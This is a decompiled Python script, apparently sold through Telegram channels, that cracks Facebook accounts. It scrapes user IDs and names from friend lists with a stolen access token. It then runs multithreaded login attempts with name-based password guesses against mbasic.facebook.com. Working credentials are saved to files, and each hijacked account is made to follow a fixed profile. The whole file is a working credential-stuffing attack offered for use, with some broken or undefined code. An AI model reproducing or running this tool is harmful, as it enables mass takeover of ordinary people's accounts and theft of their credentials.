# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2023-03-20 11:55:07.331567
import os
import sys
import time
import requests
os.system('clear')
os.system('rm -rf list.txt')
os.system('SALE -u > list.txt')
uid = open('list.txt', 'r')
for j in uid:
    sp = j.split()
def I():
    idd = str(os.getlogin())
    id = 'm'.join(idd)
    print("\x1b[37;1mID TO:\x1b[1;91m "+id)
    if id in requests.get("https://raw.githubusercontent.com/0-SALE-0/File-Clone/main/Active.txt").text:
        print("\033[92m IDEAKAT ACTIVE BO .....")
        time.sleep(1)
        pass
    else:
        print("\033[91m TOOL PRICE 5$ DOLAR SEND @py_SALE")
        os.system('xdg-open https://t.me/py_SALE')


        os.system('xdg-open https://t.me/krd_crackers')
        time.sleep(1)
        sys.exit()
I()
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
os.system("pip install marshal")
try:
	prox= requests.get('https://github.com/0-SALE-0/File/blob/main/Sale-Ip.txt').text
	open('.Sale-Ip.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.Sale-Ip.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('Sale-Mobile.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/0-SALE-0/File/blob/main/Sale-Mobile.txt').text
		ua=open('.Sale-Mobile.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.Sale-Mobile.txt','r').read().splitlines()

import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;31m' # 

H = '\033[1;32m' # 

K = '\x1b[1;97m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

logo =                                          """   

░██████╗░█████╗░██╗░░░░░███████╗
██╔════╝██╔══██╗██║░░░░░██╔════╝
╚█████╗░███████║██║░░░░░█████╗░░
░╚═══██╗██╔══██║██║░░░░░██╔══╝░░
██████╔╝██║░░██║███████╗███████╗
╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝"""  

def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mSALE_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSALE_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mTOOL BY SALE")

	    sarfraz()

def sarfraz():

    os.system('clear')

    print(logo)

    ipm = requests.get(url_ip).json()

    todz = ''

    IP = ipm['origin']

    print

    print(' [1] CRACK BA REGAY FILE')

    print('')

    _sarfraz___ = input(' [?] Halbzhera : ')

    if _sarfraz___ in ('1', '01'):

        __xxx__().sarfrazx(id)

    if _sarfraz___ in ('3', '03'):

        create_file()

    if _sarfraz___ in ('E', 'ee'):

        pass

class __xxx__:

    def __init__(self):

        self.id = []

    def sarfrazx(self,id):

        os.system("clear")

        print(logo)

        self.cnt = input('Nawe File Dane  : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.sarfrazx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\r \x1b[1;97mSALE {loop}|{len(self.id)} OK[{len(ok)}] CP[{len(cp)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":cebok,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "dnt":"1",

                    "x-requested-with":"mark.via.gp",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://m.facebook.com/",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                header1 = {

                    "Host":cebok,

                    "cache-control":"max-age=0",

                    "upgrade-insecure-requests":"1",

                    "origin":"https://"+cebok,

                    "content-type":"application/x-www-form-urlencoded",

                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "x-requested-with":"XMLHttpRequest",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [SALE-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('SALE_OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        print('\r%s [SALE-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('SALE_CP.txt' , 'a').write('%s\n' % wrt)

                        break

                    except (KeyError, IOError):

                        month = ''

                        day   = ''

                        year  = ''

                    except:

                        pass

                    print('\r%s [SALE-CP] %s | %s ' % (M, user, pw))

                    wrt = '%s|%s' % (user,pw)

                    cp.append(wrt)

                    open('SALE_CP.txt' , 'a').write('%s\n' % wrt)

                    break

                else:

                    continue

            loop+=1

        except:

            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')

        get = r.find('a', string='Ikuti').get('href')

        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):

        print('[1] Crack Krdn ')

        print('[2] Crack Xot Pass Dane ')

        chi = input('\n [?] Halbzhera: ')

        if chi == '':

            print('\nSelect Correct One')

            self.__pler__()

        elif chi in ('1', '01'):

            os.system("clear")

            print(logo)

            print("\033[1;31m\rCHENAL : @krd_crackers\033[1;37m")

            print(47*"-")

            print('\033[1;37m Hamo Id Ea Kan👉 : %s ' % len(self.id))

            print('\033[1;37m Crack Dasti Pe Krd...')

            print(47*"-")

            with sarfrazssb(max_workers=30) as ssbworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        first, last = name.split(' ')

                        firstl = first.lower()

                        lastl = last.lower()

                        firsts = first.capitalize()

                        lasts = last.capitalize()

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [firstl+' '+lastl, xz[0]+"0000", xz[0]+"2222",xz[0]+"9999",xz[0]+"1111",xz[0]+"@12",xz[0]+"@123",xz[0]+"@1234",xz[0]+"@12345",xz[0]+".12",xz[0]+".123",xz[0]+".1234",xz[0]+".12345",xz[0]+"12",xz[0]+"123",xz[0]+"1234"]
                        else:

                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"0780",xz[0]+"0770",xz[0]+"2001",xz[0]+"0750"],xz[0]+"0000",xz[0]+"2004",xz[0]+"12",xz[0]+"4321",xz[0]+"321",xz[0]+"54321",xz[0]+"112233",xz[0]+"11223344",xz[0]+"1122334455",xz[0]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            sale(ok,cp)

        elif chi in ('2', '02'):

            os.system("clear")

            print(logo)

            print("\033[1;37m\rBa dli xot pass dane \033[1;37m\n")

            p1 = input('  Name + 1 : ')

            p2 = input('  Name + 2 : ')

            p3 = input('  Name + 3 : ')

            p4 = input('  Name + 4 : ')

            p4 = input('  Name + 5 : ')

            p4 = input('  Name + 6 : ')

            p4 = input('  Name + 7 : ')

            p4 = input('  Name + 8 : ')

            p4 = input('  Name + 9 : ')

            p4 = input('  Name + 10 : ')
    
            os.system("clear")

            print(logo)

            print("\033[1;31m\r CHENAL : @krd_crackers\033[1;37m")

            print(47*"-")

            print('\033[1;37m ZHMARAI ID 👉 : %s ' % len(self.id))

            print('\033[1;37m CRACK DASTI PE KRD...')

            print(47*"-")

            with sarfrazssb(max_workers=30) as ssbworld:

                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia

                    try:

                        uid, name = zsb.split('|')

                        xz = name.split(' ')

                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:

                            pwx = [name, xz[0]+"2019", xz[0]+xz[1], xz[0]+"2018"]
                            pwx = [name, xz[0]+"2017", xz[0]+xz[1], xz[0]+"2016"]
                            pwx = [name, xz[0]+"2015", xz[0]+xz[1], xz[0]+"2014"]
                            pwx = [name, xz[0]+"2013", xz[0]+xz[1], xz[0]+"2012"]   
                            pwx = [name, xz[0]+"2011", xz[0]+xz[1], xz[0]+"2010"]
                            pwx = [name, xz[0]+"2009", xz[0]+xz[1], xz[0]+"2008"]
                            pwx = [name, xz[0]+"2007", xz[0]+xz[1], xz[0]+"2006"]
                            pwx = [name, xz[0]+"2005", xz[0]+xz[1], xz[0]+"2004"]
                            pwx = [name, xz[0]+"2003", xz[0]+xz[1], xz[0]+"2002"]   
                            pwx = [name, xz[0]+"2001", xz[0]+xz[1], xz[0]+"2000"]


                        else:

                            pwx = [name, xz[0]+"1999", xz[0]+xz[1], xz[0]+"1998"]
                            pwx = [name, xz[0]+"1997", xz[0]+xz[1], xz[0]+"1996"]
                            pwx = [name, xz[0]+"1995", xz[0]+xz[1], xz[0]+"1994"]
                            pwx = [name, xz[0]+"1993", xz[0]+xz[1], xz[0]+"1992"]   
                            pwx = [name, xz[0]+"1991", xz[0]+xz[1], xz[0]+"1990"]
                            pwx = [name, xz[0]+"1989", xz[0]+xz[1], xz[0]+"1988"]
                            pwx = [name, xz[0]+"1987", xz[0]+xz[1], xz[0]+"1986"]
                            pwx = [name, xz[0]+"1985", xz[0]+xz[1], xz[0]+"1984"]
                            pwx = [name, xz[0]+"1983", xz[0]+xz[1], xz[0]+"1982"]   
                            pwx = [name, xz[0]+"1981", xz[0]+xz[1], xz[0]+"1980"]
                            pwx = [name, xz[0]+"1979", xz[0]+xz[1], xz[0]+"1978"]
                            pwx = [name, xz[0]+"1977", xz[0]+xz[1], xz[0]+"1976"]
                            pwx = [name, xz[0]+"1975", xz[0]+xz[1], xz[0]+"1974"]
                            pwx = [name, xz[0]+"1973", xz[0]+xz[1], xz[0]+"1972"]   
                            pwx = [name, xz[0]+"1971", xz[0]+xz[1], xz[0]+"1970"]


                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")

                    except:

                        pass

            hasil(ok,cp)

        else:

            print('\n Select Valid One')

            self.__pler__()

def create_file():

    os.system('clear')

    print(logo)

    print('  [1] Crack file Best')

    print('  [2] Crack file auto')

    print('  [B] Darchun la tool')

    print(50*'-')

    cf = input('  Halbzhera: ')

    if cf =='1':

        manual()

    elif cf =='2':

        auto()

    elif cf =='3':

        likes()

    elif cf =='3' or cf =='b' or cf =='B':

        main()

    else:

        print('\n  Choose correct option ...')

        time.sleep(1)

        create_file()

def manual():

    try:

        token = open('/sdcard/tokenofl.txt', 'r').read()

    except FileNotFoundError:

        login()

    try:

        r = requests.get('https://graph.facebook.com/me?access_token='+token).text

        q = json.loads(r)

        uname = q['name']

    except (KeyError):

        login()

    os.system('clear')

    print(logo)

    print('  Name: '+uname)

    print(50*'-')

    limit = int(input('  How many ids do you want to add ? '))

    save_file = input('  Save file as: ')

    t = 0

    for u in range(limit):

        t+=1

        try:

            ids = input('  Put id no%s: '%t)

            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text

            q = json.loads(r)

            for j in q['data']:

                uids = j['id']

                names = j['name']

                first_name = names.split(' ')[0]

                try:

                    last_name = names.split(' ')[1]

                except:

                    last_name = 'sale'

                with open('/sdcard/'+save_file, 'a') as rd:

                    rd.write(uids+'|'+first_name+'|'+last_name+'\n')

        except KeyError:

            print('  No friend for '+ids)

            pass

    print(50*'-')

    print('  Ids saved as: '+save_file)

    print(50*'-')

    input(' Press enter to back')

    sarfraz()

    

def auto():

    os.system('rm -rf temp*')

    try:

        access_token = open('/sdcard/tokenofl.txt', 'r').read()

    except:

        login()

    try:

        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text

        q = json.loads(r)

        uname = q['name']

    except:

        login()

    os.system('clear')

    print(logo)

    print('  Logged user: '+uname)

    print(50*'-')

    nusrat = []

    try:

        limit_user = int(input('  How many ids do you want to add ? '))

    except:

        limit_user = 1

    count = 0

    for fir in range(limit_user):

        count +=1

        udit = input('  Put id%s: '%(count))

        try:

            tfile = open('/sdcard/tokenofl.txt','r').read()

            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text

            qfr = json.loads(fr)

            temp_save = open('temp.txt', 'a')

            for data in qfr['data']:

                uids = data['id']

                if uids in nusrat:

                    pass

                else:

                    nusrat.append(uids)

                    temp_save.write(uids+'\n')

            temp_save.close()

        except KeyError:

            if 'invalid' in str(fr):

                print('  Logged token has expired ...')

                pass

            else:

                print('  No friends found for user: '+udit)

                pass

    os.system('clear')

    print(logo)

    print('   Total ids: '+str(len(nusrat)))

    print(50*'-')

    try:

        ask_link = int(input('  How many links do you want to grab? '))

    except:

        ask_link = 1

    completed = 0

    for links in range(ask_link):

        completed +=1

        li = input('  %s Link start with: '%completed)

        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')

    save_file = input('  Save file as: ')

    os.system('clear')

    lines = open('temp2.txt', 'r').readlines()

    print(logo)

    print('  Total ids to grab: '+str(len(lines)))

    print('  Grabbing Process has started')

    print(50*'-')

    fileid = 'temp2.txt'

    fileidopen = open(fileid, 'r').read().splitlines()

    dill = []

    for ids in fileidopen:

        try:

            tfile = open('/sdcard/tokenofl.txt','r').read()

            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+tfile).text

            rgq = json.loads(rg)

            idsave=open('/sdcard/'+save_file, 'a')

            for inayat in rgq['data']:

                uids = inayat['id']

                dill.append(uids)

                nm = inayat['name']

                first_name = nm.split(' ')[0]

                try:

                    last_name = nm.split(' ')[1]

                except:

                    last_name = 'sale'

                idsave.write(uids+'|'+first_name+'|'+last_name+'\n')

            print('  Grabbed from: '+ids)

           # print('  Total friends: '+str(len(uids)))

            print('  Token status: Live')

            print(50*'-')

            idsave.close()

        except Exception as e:

            #print(e)

            if 'invalid' in str(rg):

                print('  Token has expired, try again ...')

                os.system('rm -rf temp*')

                pass

            else:

                print('  Grabbed from: '+ids)

                print('  Friendlist ids: 0')

                print('  Token status: Live')

                print(50*'-')

                os.system('rm -rf temp*')

                pass

    lenid = open('/sdcard/'+save_file, 'r').readlines()

    print('  Grabbing Process has completed ')

    os.system('rm -rf temp*')

    print('  Total ids grabbed: '+str(len(lenid)))

    print('  File saved as: /sdcard/'+save_file)

    print(50*'-')

    input('  Press enter to back ')

    safraz()

    

    

    

sarfraz()
